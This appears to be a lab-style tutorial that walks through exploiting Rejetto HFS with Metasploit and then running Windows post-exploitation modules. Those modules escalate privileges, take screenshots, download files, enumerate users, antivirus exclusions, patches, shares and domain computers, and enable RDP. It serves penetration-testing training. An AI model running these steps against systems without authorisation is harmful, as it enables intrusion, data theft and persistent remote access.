# Windows Post Exploitation Modules

## Overview

- **Metasploit Framework (MSF)** provides various **post-exploitation modules** for both Windows and Linux systems.
- These modules allow us to enumerate detailed information about the Windows system we've gained access to, such as:
  - **Enumerating user privileges**
  - **Identifying logged-on users**
  - **Checking if the target is a Virtual Machine (VM)**
  - **Enumerating installed programs and patches**
  - **Checking antivirus software and excluded folders**
  - **Enumerating computers connected to a domain**
  - **Enumerating shared directories**

## Demo: Windows Post Exploitation Modules

### Step-by-Step Process

Start the PostgreSQL service and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the post-exploitation process:

```bash
workspace -a windows_post
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

Perform an Nmap scan to identify services:

```bash
db_nmap -sV [targetIP]
```

Search for an **exploitation module** (e.g., Rejetto HFS):

```bash
search rejetto
```

Use the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Show available options:

```bash
show options
```

Run the exploit to gain access:

```bash
run
```

### Interacting with Meterpreter Session

Once access is obtained, interact with the Meterpreter session:

- Retrieve system information:

    ```bash
    sysinfo
    ```

- Check the current user ID:

    ```bash
    getuid
    ```

- Display Meterpreter help:

    ```bash
    help
    ```

- Attempt to escalate privileges:

    ```bash
    getsystem
    ```

- Take a screenshot of the target's desktop:

    ```bash
    screenshot
    ```

- Display mounted drives:

    ```bash
    show_mounts
    ```

- Migrate to another process (replace `2212` with the actual process ID):

    ```bash
    migrate 2212
    ```

- Check the current working directory:

    ```bash
    pwd
    ```

- Download a file from the target system:

    ```bash
    download flag.txt
    ```

Put the session in the background:

```bash
background
```

### Using Post-Exploitation Modules

#### Changing Architecture

Use the **migrate** post-exploitation module to change the architecture:

```bash
use post/windows/manage/migrate
```

Show the available options:

```bash
show options
```

#### Enumerating User Privileges

Search for a **privileges enumeration module**:

```bash
search win_privs
```

Use the **win_privs** module to enumerate the privileges of the current user:

```bash
use post/windows/gather/win_privs
```

Show options:

```bash
show options
```

Set the current session (assuming session `1`):

```bash
set SESSION 1
```

Run the module:

```bash
run
```

#### Enumerating Logged-On Users

Search for a module to enumerate logged-on users:

```bash
search enum_logged_on
```

Use the **enum_logged_on_users** module:

```bash
use post/windows/gather/enum_logged_on_users
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Checking If Target Is a Virtual Machine

Search for the **check_vm** module:

```bash
search checkvm
```

Use the **checkvm** module:

```bash
use post/windows/gather/checkvm
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enumerating Installed Programs

Search for the **enum_applications** module:

```bash
search enum_applications
```

Use the **enum_applications** module:

```bash
use post/windows/gather/enum_applications
```

Show options and run the module:

```bash
set SESSION 1
run
```

The module will provide a list of installed programs, which can be cross-referenced to identify potential exploitation opportunities.

Check the collected information:

```bash
loot
```

#### Checking Antivirus Software and Excluded Folders

Search for the **AV enumeration** module:

```bash
search type:post platform:windows enum_av
```

Use the **enum_av_excluded** module:

```bash
use post/windows/gather/enum_av_excluded
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enumerating Computers in the Domain

Search for the **enum_computers** module:

```bash
search enum_computer
```

Use the **enum_computers** module:

```bash
use post/windows/gather/enum_computers
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enumerating Installed Patches

Search for the **enum_patches** module:

```bash
search enum_patches
```

Use the **enum_patches** module:

```bash
use post/windows/gather/enum_patches
```

Show options and run the module:

```bash
set SESSION 1
run
```

Alternatively, gather patch information manually:

- Switch to session `1`:

    ```bash
    sessions 1
    ```

- Use the Windows shell to get system info:

    ```bash
    shell
    systeminfo
    ```

Exit the shell:

```bash
CTRL + C
CTRL + Z
```

#### Enumerating Shares

Search for the **enum_shares** module:

```bash
search enum_shares
```

Use the **enum_shares** module:

```bash
use post/windows/gather/enum_shares
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enabling Remote Desktop (RDP)

Search for an **RDP management module**:

```bash
search rdp platform:windows
```

Use the **enable_rdp** module to enable RDP:

```bash
use post/windows/manage/enable_rdp
```

Show options and run the module:

```bash
set SESSION 1
run
```

### Conclusion

What we accomplished:
- Gained access to a Windows system via Meterpreter.
- Used various **post-exploitation modules** to gather critical information about the system, including user privileges, installed programs, AV solutions, and more.
- Managed the session to further exploit the system and establish deeper control.
